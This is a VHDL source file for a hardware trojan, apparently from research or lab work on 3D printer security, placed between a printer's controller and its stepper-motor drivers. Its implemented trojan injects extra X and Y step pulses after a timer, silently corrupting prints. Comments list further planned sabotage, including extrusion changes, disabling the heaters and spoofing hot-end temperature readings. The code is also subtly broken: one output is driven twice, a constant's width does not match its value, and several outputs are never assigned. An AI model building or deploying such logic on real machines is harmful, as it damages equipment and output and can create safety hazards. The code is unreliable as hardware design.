library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use IEEE.STD_LOGIC_UNSIGNED.ALL;

entity TROJAN_TOP is
    Port (
        i_CLK               : in  std_logic;
        homing_complete     : in  std_logic;
        
        -- Data Signals In
        i_E0_DIR    : in std_logic;
        i_E0_EN     : in std_logic;
        i_E0_STEP   : in std_logic;
        i_X_DIR     : in std_logic; 
        i_X_EN      : in std_logic; 
        i_X_MIN     : in std_logic; 
        i_X_STEP    : in std_logic;   
        i_Y_DIR     : in std_logic; 
        i_Y_EN      : in std_logic; 
        i_Y_MIN     : in std_logic; 
        i_Y_STEP    : in std_logic; 
        i_Z_DIR     : in std_logic; 
        i_Z_EN      : in std_logic; 
        i_Z_MIN     : in std_logic; 
        i_Z_STEP    : in std_logic; 

        -- Data Signals Out
        o_E0_DIR    : out std_logic;
        o_E0_EN     : out std_logic;
        o_E0_STEP   : out std_logic;
        o_X_DIR     : out std_logic; 
        o_X_EN      : out std_logic; 
        o_X_MIN     : out std_logic; 
        o_X_STEP    : out std_logic; 
        o_Y_DIR     : out std_logic; 
        o_Y_EN      : out std_logic; 
        o_Y_MIN     : out std_logic; 
        o_Y_STEP    : out std_logic; 
        o_Z_DIR     : out std_logic; 
        o_Z_EN      : out std_logic; 
        o_Z_MIN     : out std_logic; 
        o_Z_STEP    : out std_logic  
    );
end TROJAN_TOP;

architecture Behavioral of Trojan_TOP is

    COMPONENT PULSE_GEN
    PORT ( 
        i_CLK           : in  STD_LOGIC;
        i_PULSE_EN      : in  STD_LOGIC;
        i_PULSES_TO_SEND: in  std_logic_vector(4 downto 0);
        o_PULSE_SIG     : out STD_LOGIC;
        o_COMPLETE      : out STD_LOGIC
    );
    END COMPONENT;

    COMPONENT RISING_EDGE_DETECTOR
	PORT(
        i_CLK     : in  STD_LOGIC;
        input     : in  STD_LOGIC;
        output    : out STD_LOGIC
		);
	END COMPONENT;
	   
    -- Edge Detected signals
    signal X_STEP_EDGE : std_logic := '0';
    signal Y_STEP_EDGE : std_logic := '0';
    signal Z_STEP_EDGE : std_logic := '0';
    signal E_STEP_EDGE : std_logic := '0';

    -- Pulse Related Signals per Axis
    constant PULSES_PER_STEP : std_logic_vector(5 downto 0) := "10000";  -- 16 pulses per step --> 1.8 degrees (?)
    constant TEN_SECONDS     : std_logic_vector(29 downto 0) := "111011100110101100101000000000"; -- 10 seconds at 100 Mhz
    
    -- Modified Output Signals 
    signal X_STEP_MOD : std_logic := '0';
    signal Y_STEP_MOD : std_logic := '0';
    signal Z_STEP_MOD : std_logic := '0';
    signal E_STEP_MOD : std_logic := '0';

    -- Enable Signals for Axis Pulse gen 
    signal X_PULSE_EN : std_logic := '0';
    signal Y_PULSE_EN : std_logic := '0';
    signal Z_PULSE_EN : std_logic := '0';
    signal E_PULSE_EN : std_logic := '0';

    -- Required steps are sent
    signal X_STEP_COMPLETE : std_logic := '0';
    signal Y_STEP_COMPLETE : std_logic := '0';
    signal Z_STEP_COMPLETE : std_logic := '0';
    signal E_STEP_COMPLETE : std_logic := '0';

    -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
    signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds or removes steps from X or Y axis during move
    signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
    signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
    signal TROJ_T5_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power
    signal TROJ_T6_ENABLE : std_logic := '0'; -- Spoofing of measured hot-end thermocouple temperatures via ADC
    signal TROJ_T7_ENABLE : std_logic := '0'; -- 
    signal TROJ_T8_ENABLE : std_logic := '0'; -- 

    type State_Type is (IDLE, STATE_1, STATE_2, STATE_3, STATE_4, STATE_5, DISABLE);

    -- Trojan 1 Related Signals 
    signal T1_STATE, T1_NEXT_STATE: State_Type;
    signal TROJ_T1_COUNTER : std_logic_vector (29 downto 0) := (others=>'0');

    -- Trojan 2 Related Signals 
    -- Trojan 3 Related Signals 
    -- Trojan 4 Related Signals 
    -- Trojan 5 Related Signals 
    -- Trojan 6 Related Signals 
    -- Trojan 7 Related Signals    
    
begin

    ------- Components--------- 
    -- Edge Detectors 
    X_STEP_EDGE_DETECT : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_X_STEP,  output => X_STEP_EDGE);
    Y_STEP_EDGE_DETECT : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_Y_STEP,  output => Y_STEP_EDGE);
    Z_STEP_EDGE_DETECT : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_Z_STEP,  output => Z_STEP_EDGE);
    E_STEP_EDGE_DETECT : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_E0_STEP, output => E_STEP_EDGE);
    
    -- Pulse Generators
    X_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => X_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => X_STEP_MOD, o_COMPLETE => X_STEP_COMPLETE);
    Y_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => Y_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => Y_STEP_MOD, o_COMPLETE => Y_STEP_COMPLETE);
    Z_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => Z_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => Z_STEP_MOD, o_COMPLETE => Z_STEP_COMPLETE);
    E_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => E_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => E_STEP_MOD, o_COMPLETE => E_STEP_COMPLETE);
    
    --------------------------- Pulse Gen Test Start ---------------------------
    -- For testing the output of the pulse gen in trojan mode
    -- This part of the code should countinously move the X axis when bypass mode is turned off 
    -- TODO: Remove this part of the module after test
    o_X_DIR  <= i_X_DIR;  
    o_X_EN   <= i_X_EN;   
    o_X_MIN  <= i_X_MIN;  
    o_X_STEP <= X_STEP_MOD;

    Pulse_Test_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            X_PULSE_EN <= '1';
        end if;
    end process;
    --------------------------- Pulse Gen Test End ---------------------------
 
    --------------------------- Trojan 1 Logic Start ---------------------------
    -- This trojan adds or removes steps from the X and Y Axis 
    
    o_X_STEP <= i_X_STEP or X_STEP_MOD;
    o_Y_STEP <= i_Y_STEP or Y_STEP_MOD;

    trojan_t1_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T1_STATE <= T1_NEXT_STATE;
            case T1_STATE is
                when IDLE =>
                    if TROJ_T1_ENABLE = '1' then
                        T1_NEXT_STATE <= STATE_1;
                    else
                        T1_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => -- Counter Enable
                    if(TROJ_T1_COUNTER = TEN_SECONDS) then
                        TROJ_T1_COUNTER <= (others=>'0');
                        T1_NEXT_STATE <= STATE_2;
                    else 
                        TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
                    end if;

                when STATE_2 => -- Send Steps to motor X
                    if(X_STEP_COMPLETE = '1') then
                        X_PULSE_EN <= '0';
                        T1_NEXT_STATE <= STATE_3;
                    else 
                        X_PULSE_EN <= '1';
                    end if;
                        
                when STATE_3 => -- Send Steps to motor Y
                    if(Y_STEP_COMPLETE = '1') then
                        Y_PULSE_EN <= '0';
                        T1_NEXT_STATE <= IDLE;
                    else 
                        Y_PULSE_EN <= '1';
                    end if;

                when DISABLE => -- Turn off signals here
                    TROJ_T1_COUNTER <= (others=>'0');
                    X_PULSE_EN <= '0';
                    Y_PULSE_EN <= '0';
                    T1_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;
    --------------------------- Trojan 1 Logic End ---------------------------


    --------------------------- Trojan 2 Logic Start ---------------------------
    -- This trojan adds or removes steps from the X and Y Axis 
    -- trojan_t2_proc : process (i_CLK)
    -- begin
    --     if rising_edge(i_CLK) then
    --         T2_STATE <= T2_NEXT_STATE;
    --         case T2_STATE is
    --             when IDLE =>
    --                 if TROJ_T2_ENABLE = '1' then
    --                     T2_NEXT_STATE <= STATE_1;
    --                 else
    --                     T2_NEXT_STATE <= DISABLE;
    --                 end if;

    --             when STATE_1 =>

    --             when STATE_2 => 

    --             when DISABLE => -- Turn off signals here
                    

    --                 T2_NEXT_STATE <= IDLE;
    --         end case;
    --     end if;
    -- end process;
    --------------------------- Trojan 2 Logic End ---------------------------


end Behavioral;
